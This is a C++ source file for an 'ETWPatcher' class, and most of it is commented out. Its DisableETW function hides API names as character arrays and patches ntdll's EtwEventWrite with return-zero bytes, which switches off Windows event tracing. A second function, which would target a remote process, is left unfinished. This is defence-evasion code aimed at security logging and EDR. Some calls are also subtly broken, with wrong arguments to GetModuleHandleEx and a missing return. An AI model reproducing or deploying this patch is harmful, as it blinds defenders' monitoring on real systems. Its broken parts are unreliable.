#include <Windows.h>
#include <iostream>

using namespace std;

class ETWPatcher {
public:
    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    wchar_t sKernel32W[12] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l' };

//    int DisableETW() {
//        unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
//        VirtualProtect_t VirtualProtectFunction = (VirtualProtect_t)GetProcAddress(GetModuleHandle(sKernel32W), (LPCSTR)sVirtualProtect);
//        DWORD oldprotect = 0;
//        //unsigned char sGetModuleHandleEx[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'E', 'x', 0x0 };
//        unsigned char sEtwEventWrite[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0x0 };
//        void* pEventWrite = GetProcAddress(GetModuleHandleEx(L"ntdll.dll"), (LPCSTR)sEtwEventWrite);
//        VirtualProtectFunction(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
//
//#ifdef _WIN64
//        memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
//#else
//        memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
//#endif
//
//        VirtualProtectFunction(pEventWrite, 4096, oldprotect, &oldprotect);
//        FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
//        return 0;
//    }
//
//    int DisableETWInRemoteProcess(int pid){
//        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//		if (hProcess == NULL) {
//			cout << "Failed to open process" << endl;
//			return 1;
//		}
//		unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
//		VirtualProtect_t VirtualProtectFunction = (VirtualProtect_t)GetProcAddress(GetModuleHandle(sKernel32W), (LPCSTR)sVirtualProtect);
//		DWORD oldprotect = 0;
//		unsigned char sEtwEventWrite[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0x0 };
//		//void* pEventWrite = GetProcAddress(GetModuleHandleEx(L"ntdll.dll", hProcess), (LPCSTR)sEtwEventWrite);
//		//VirtualProtectFunction(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
//
//
//    }


};
